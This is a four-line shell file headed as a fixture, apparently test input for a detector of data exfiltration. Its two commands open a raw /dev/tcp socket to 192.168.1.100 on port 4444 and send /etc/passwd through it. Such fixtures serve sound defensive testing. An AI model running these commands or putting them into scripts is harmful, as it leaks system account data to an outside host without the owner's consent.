# fixture: dev_tcp_exfiltration.sh
# Sends /etc/passwd to a remote server without using any external binaries
exec 5<>/dev/tcp/192.168.1.100/4444
cat /etc/passwd >&5
